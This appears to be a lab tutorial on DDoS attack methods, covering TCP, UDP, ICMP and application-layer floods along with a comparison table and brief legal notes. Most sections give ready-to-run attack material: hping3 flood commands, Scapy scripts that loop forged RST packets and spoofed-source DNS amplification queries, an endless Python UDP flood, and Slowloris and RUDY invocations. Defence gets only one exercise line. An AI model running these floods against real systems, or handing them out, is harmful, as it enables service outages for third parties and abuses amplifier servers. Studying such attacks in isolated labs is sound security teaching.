# DDoS Attack Methods: Detailed Breakdown

## 1. TCP-Based Attacks
TCP (Transmission Control Protocol) is a connection-oriented protocol that ensures reliable data transfer through a three-way handshake (SYN, SYN-ACK, ACK). TCP-based DDoS attacks exploit this reliability mechanism to overwhelm a target’s resources.

### Common TCP-Based Attack Methods
#### a. **SYN Flood**
- **How It Works**: The attacker sends a flood of TCP SYN packets to initiate connections but never completes the handshake (no ACK). This fills the target’s connection queue, preventing legitimate connections.
- **Target**: TCP stack on servers (e.g., web servers, databases).
- **Impact**: Exhausts server resources (memory, CPU) by maintaining half-open connections.
- **Example Tool**: `hping3` in Kali.
  ```bash
  hping3 -S --flood -V -p 80 <target_IP>
  ```
- **Lab Demo**:
  1. Set up a target VM (e.g., Ubuntu with Apache).
  2. Run the above command from Kali.
  3. Check the target with `netstat -an | grep SYN_RECV` to see queued connections.
- **Difference**: SYN floods focus on exhausting connection tables, not bandwidth, unlike volumetric attacks.

#### b. **TCP RST Attack**
- **How It Works**: Sends forged TCP RST (reset) packets to abruptly terminate active connections between the target and legitimate users.
- **Target**: Active TCP sessions (e.g., user connections to a web server).
- **Impact**: Disrupts ongoing connections, causing service interruptions.
- **Example Tool**: Scapy (Python).
  ```python
  from scapy.all import *
  packet = IP(dst="<target_IP>")/TCP(sport=12345, dport=80, flags="R")
  send(packet, loop=1, verbose=0)
  ```
- **Difference**: Unlike SYN floods, RST attacks disrupt existing connections rather than creating new ones.

#### c. **TCP PSH+ACK Flood**
- **How It Works**: Sends TCP packets with PSH (push) and ACK flags, forcing the target to process data immediately, overwhelming the application layer.
- **Target**: Application handling TCP data (e.g., web servers).
- **Impact**: Consumes server CPU/memory by forcing rapid data processing.
- **Example Tool**: `hping3`.
  ```bash
  hping3 -A -P --flood -p 80 <target_IP>
  ```
- **Difference**: Targets application processing rather than connection establishment, unlike SYN floods.

## 2. UDP-Based Attacks
UDP (User Datagram Protocol) is connectionless, sending packets without handshakes, making it ideal for high-volume, low-effort floods. UDP-based DDoS attacks aim to saturate bandwidth or overload services.

### Common UDP-Based Attack Methods
#### a. **UDP Flood**
- **How It Works**: Sends a massive volume of UDP packets to random or specific ports on the target, overwhelming its network stack or bandwidth.
- **Target**: Network interfaces, firewalls, or services listening on UDP ports (e.g., DNS, NTP).
- **Impact**: Consumes bandwidth and processing power, causing latency or crashes.
- **Example Code**: Python-based UDP flood (from previous lesson).
  ```python
  import socket
  import random
  target_ip = "192.168.56.101"  # Target VM IP
  target_port = 80
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  bytes = random._urandom(1490)
  while True:
      sock.sendto(bytes, (target_ip, target_port))
      print(f"Sent UDP packet to {target_ip}:{target_port}")
  ```
- **Lab Demo**:
  1. Run the script on Kali.
  2. On the target, use `tcpdump udp` to observe packet flood.
- **Difference**: UDP floods are simpler than TCP attacks, requiring no handshake, but they focus on raw bandwidth exhaustion.

#### b. **DNS Amplification**
- **How It Works**: Sends small DNS queries with a spoofed source IP (the target’s IP) to open DNS servers, which respond with large replies, flooding the target.
- **Target**: Any system with a spoofable IP.
- **Impact**: Amplifies traffic (e.g., 50-byte query generates 500-byte response), overwhelming bandwidth.
- **Example Code**: Scapy-based DNS amplification (from previous lesson).
  ```python
  from scapy.all import *
  target_ip = "192.168.56.101"
  dns_server = "192.168.56.102"
  packet = IP(src=target_ip, dst=dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
  send(packet, loop=1, verbose=0)
  ```
- **Difference**: Unlike basic UDP floods, amplification attacks leverage third-party servers to multiply traffic.

#### c. **NTP Amplification**
- **How It Works**: Similar to DNS amplification but exploits NTP servers’ `monlist` command, which returns large responses for small queries.
- **Target**: Systems with spoofed IPs.
- **Impact**: High amplification factor (up to 500x), saturating bandwidth.
- **Example Tool**: `hping3` or custom Scapy scripts.
- **Difference**: Targets specific NTP vulnerabilities, unlike generic UDP floods.

## 3. Other Common DDoS Methods
Beyond TCP and UDP, other protocols and techniques target different layers or services.

#### a. **ICMP Flood (Ping Flood)**
- **How It Works**: Sends a flood of ICMP Echo Request (ping) packets, forcing the target to respond with Echo Replies.
- **Target**: Network stack handling ICMP.
- **Impact**: Consumes bandwidth and CPU.
- **Example Tool**: `hping3`.
  ```bash
  hping3 -1 --flood <target_IP>
  ```
  - `-1`: ICMP mode.
- **Difference**: Simpler than TCP/UDP attacks, as ICMP is stateless, but less effective against modern systems with ICMP rate limiting.

#### b. **HTTP Flood (Application Layer)**
- **How It Works**: Sends legitimate-looking HTTP requests (GET/POST) to overwhelm a web server’s resources (e.g., CPU, memory, database).
- **Target**: Web servers (e.g., Apache, Nginx).
- **Impact**: Exhausts application resources, not just network bandwidth.
- **Example Tool**: Slowloris (from previous lesson).
  ```bash
  slowloris -s 500 -p 80 <target_IP>
  ```
- **Difference**: Targets Layer 7 (application) rather than network layers, requiring fewer packets but more precision.

#### c. **Smurf Attack**
- **How It Works**: Sends ICMP Echo Requests with a spoofed source IP (the target’s IP) to a network’s broadcast address, causing all devices to reply to the target.
- **Target**: Networks with misconfigured broadcast settings.
- **Impact**: Amplifies traffic via network devices.
- **Example Tool**: Scapy or `hping3`.
- **Difference**: Relies on network misconfiguration, unlike direct TCP/UDP floods.

#### d. **Fraggle Attack**
- **How It Works**: Similar to Smurf but uses UDP packets sent to a broadcast address.
- **Target**: UDP-based services on a network.
- **Impact**: Similar to Smurf, amplifies traffic via broadcast.
- **Difference**: UDP-based, less common due to modern network protections.

#### e. **Slowloris (Application Layer)**
- **How It Works**: Sends partial HTTP requests to keep connections open, exhausting the server’s connection pool.
- **Target**: Web servers.
- **Impact**: Low-bandwidth but highly effective against unpatched servers.
- **Example Tool**: Slowloris (covered earlier).
- **Difference**: Slow and stealthy, unlike high-volume TCP/UDP floods.

#### f. **RUDY (R-U-Dead-Yet)**
- **How It Works**: Sends slow POST requests with large content-length headers, trickling data to keep connections alive.
- **Target**: Web servers handling POST requests.
- **Impact**: Similar to Slowloris, exhausts server resources with minimal bandwidth.
- **Example Tool**: RUDY (available in Kali).
  ```bash
  rudy -t <target_URL>
  ```
- **Difference**: Focuses on POST requests, unlike Slowloris’s GET focus.

## 4. Key Differences Between Methods
| **Method**         | **Protocol** | **Layer** | **Mechanism**                     | **Resource Targeted** | **Complexity** | **Amplification** |
|--------------------|--------------|-----------|-----------------------------------|-----------------------|----------------|-------------------|
| SYN Flood          | TCP          | Transport | Half-open connections            | Connection table      | Medium         | No                |
| TCP RST            | TCP          | Transport | Terminates active connections    | Active sessions       | Medium         | No                |
| PSH+ACK Flood      | TCP          | Transport | Forces data processing           | CPU/Memory            | Medium         | No                |
| UDP Flood          | UDP          | Transport | Raw packet flood                 | Bandwidth/CPU         | Low            | No                |
| DNS Amplification  | UDP          | Transport | Spoofed queries, large responses | Bandwidth             | High           | Yes               |
| NTP Amplification  | UDP          | Transport | Spoofed NTP queries              | Bandwidth             | High           | Yes               |
| ICMP Flood         | ICMP         | Network   | Ping flood                       | Bandwidth/CPU         | Low            | No                |
| HTTP Flood         | TCP          | Application | Legitimate HTTP requests         | Server resources      | High           | No                |
| Smurf Attack       | ICMP         | Network   | Broadcast amplification          | Bandwidth             | Medium         | Yes               |
| Fraggle Attack     | UDP          | Network   | Broadcast UDP flood              | Bandwidth             | Medium         | Yes               |
| Slowloris          | TCP          | Application | Slow HTTP requests              | Connection pool       | High           | No                |
| RUDY               | TCP          | Application | Slow POST requests              | Connection pool       | High           | No                |

## 5. Lab Exercises
1. **SYN Flood**:
   - Use `hping3` to flood a target VM’s port 80.
   - Monitor with `tcpdump` or Wireshark on the target.
2. **UDP Flood**:
   - Run the Python UDP flood script.
   - Check target resource usage with `htop`.
3. **DNS Amplification**:
   - Set up a lab DNS server (e.g., `bind9`).
   - Use the Scapy script to simulate amplification.
4. **Slowloris**:
   - Test against an Apache server in your VM.
   - Observe connection exhaustion with `netstat`.
5. **Mitigation**:
   - Apply `iptables` rules to limit SYN or UDP traffic.
   - Test if your attacks are blocked.

## 6. Ethical and Safety Notes
- **Lab Only**: Practice in an isolated VM environment (e.g., VirtualBox with host-only networking).
- **Legal**: Unauthorized attacks are illegal (e.g., CFAA in the US).
- **Defense**: Study mitigation (e.g., rate limiting, WAFs) to balance your attack knowledge.